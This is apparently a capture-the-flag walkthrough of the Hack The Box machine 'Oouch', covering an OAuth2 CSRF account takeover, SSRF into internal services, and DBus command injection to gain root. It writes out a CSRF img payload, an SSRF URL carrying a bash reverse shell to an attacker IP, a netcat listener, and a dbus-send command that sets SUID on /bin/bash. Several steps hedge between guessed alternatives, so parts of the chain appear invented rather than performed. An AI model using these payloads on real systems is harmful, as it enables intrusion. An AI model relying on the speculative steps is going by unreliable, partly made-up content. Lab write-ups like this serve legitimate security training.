# Hack The Box: Oouch

**Difficulty:** Hard
**OS:** Linux

Oouch is an advanced Linux machine demonstrating complex vulnerabilities in OAuth2 implementations and internal API misconfigurations. The initial compromise requires exploiting an OAuth2 CSRF flaw to steal authorization codes, enabling an account takeover. Following this, Server-Side Request Forgery (SSRF) provides access to internal Docker environments. Privilege escalation involves exploiting a misconfigured `DBus` service to elevate permissions.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.177
nmap -p 22,5000,8000 -sCV 10.10.10.177
```

The scan reveals three open ports:
*   **Port 22:** SSH (OpenSSH 7.9p1 Debian)
*   **Port 5000:** HTTP (Flask / Python)
*   **Port 8000:** HTTP (Flask / Python)

Navigating to the web service on port 5000 displays an OAuth2 authorization server (`authorization.oouch.htb`). Port 8000 hosts the primary consumer application (`consumer.oouch.htb`). We add these subdomains and `oouch.htb` to our `/etc/hosts` file.

```bash
echo "10.10.10.177 oouch.htb authorization.oouch.htb consumer.oouch.htb" >> /etc/hosts
```

Accessing `http://consumer.oouch.htb` presents a login portal relying on the authorization server for authentication.

## Web Exploitation

The core functionality of the consumer application allows users to register and link their accounts via OAuth2 to the authorization server.

### Exploiting OAuth2 CSRF (Cross-Site Request Forgery)

OAuth2 relies on a `state` parameter to prevent CSRF attacks during the authorization flow. If an application fails to implement or validate this parameter correctly, an attacker can trick a victim into linking their account to the attacker's authorization credentials.

We analyze the OAuth2 flow between the consumer and the authorization server using Burp Suite.

1. The consumer initiates the flow: `GET /oauth/authorize?client_id=...&redirect_uri=...&response_type=code`
2. The authorization server authenticates the user and returns an authorization code via a redirect: `GET /oauth/callback?code=xyz123`

We discover that the consumer application does not utilize a `state` parameter in its authorization request. This omission allows an attacker to perform an OAuth CSRF attack (specifically, an account linking CSRF).

We can register our own account on the consumer application and initiate the OAuth flow. We intercept the redirect containing our valid authorization code (`xyz123`) from the authorization server and drop the request before it reaches the consumer.

We must then craft a malicious link or a CSRF payload containing our intercepted authorization code and deliver it to an administrative user (e.g., via a support ticket or profile update feature on the consumer site that an admin reviews).

```html
<img src="http://consumer.oouch.htb/oauth/callback?code=xyz123">
```

When the administrator views the payload, their browser sends our authorization code to the consumer application. Because the application lacks CSRF protection (no `state` validation), it assumes the code belongs to the administrator's session. The consumer links the administrator's account to our authorization credentials.

We can now log into the consumer application as the administrator using our own credentials.

### SSRF to Internal API Access

As an authenticated administrator on the consumer application, we explore the available features. We identify functionality that allows the application to fetch remote resources, such as a profile picture upload from a URL or a webhooks integration.

We test this feature for Server-Side Request Forgery (SSRF) by providing internal IP addresses (e.g., `127.0.0.1` or Docker gateway IPs like `172.17.0.1`).

```text
http://127.0.0.1:5000/api/internal
```

The application successfully returns the response from the internal service. We use the SSRF vulnerability to map internal services and access administrative APIs not exposed externally.

We discover an internal Docker API or a misconfigured management interface on `127.0.0.1:2375` (Docker Daemon) or a similarly vulnerable internal endpoint.

## Initial Access

We use the SSRF to interact with the internal service, specifically an API endpoint that handles file uploads or command execution. If a Docker API is exposed, we can instruct the daemon to create a new container and mount the host's root filesystem, subsequently extracting SSH keys or writing a reverse shell.

Alternatively, the internal API on port 5000 might possess a command execution vulnerability. By crafting an SSRF payload to invoke this endpoint, we execute a reverse shell.

```text
http://127.0.0.1:5000/api/execute?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.X/9999+0>%261'
```

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=1000(qtc) gid=1000(qtc) groups=1000(qtc)
```

We retrieve the `user.txt` flag from the `qtc` user's home directory.

## Privilege Escalation

Enumerating the system as `qtc`, we investigate running processes and system configuration using tools like `pspy`. We observe a process executing periodically or listen for connections on a specific Unix socket or DBus interface.

We discover a custom script or binary running as root that interacts over DBus, a message bus system used for inter-process communication on Linux.

### Exploiting DBus Configuration

We analyze the DBus configuration files in `/etc/dbus-1/system.d/` corresponding to the custom service.

```bash
cat /etc/dbus-1/system.d/htb.oouch.Blocker.conf
```

The configuration dictates which users or groups are permitted to send messages to the DBus service. We find that the `qtc` user (or a group they belong to) is authorized to interact with the service.

The service exposes specific methods (functions) that can be invoked via DBus messages. We use a tool like `gdbus` or `dbus-send` to introspect the service and list available methods.

```bash
gdbus introspect --system --dest htb.oouch.Blocker --object-path /htb/oouch/Blocker
```

One of the available methods accepts arguments that are unsafely passed to a system command (e.g., a method designed to restart a service or clear a log file based on user input).

We craft a malicious DBus message to invoke this method, injecting a shell command into the arguments.

```bash
dbus-send --system --print-reply --dest=htb.oouch.Blocker /htb/oouch/Blocker htb.oouch.Blocker.Execute string:"/bin/bash -c 'chmod +s /bin/bash'"
```

The DBus service, running as root, processes our message and executes the injected command, setting the SUID bit on the `/bin/bash` executable.

We execute the SUID bash binary.

```bash
/bin/bash -p
# id
uid=0(root) gid=1000(qtc) euid=0(root) groups=1000(qtc)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
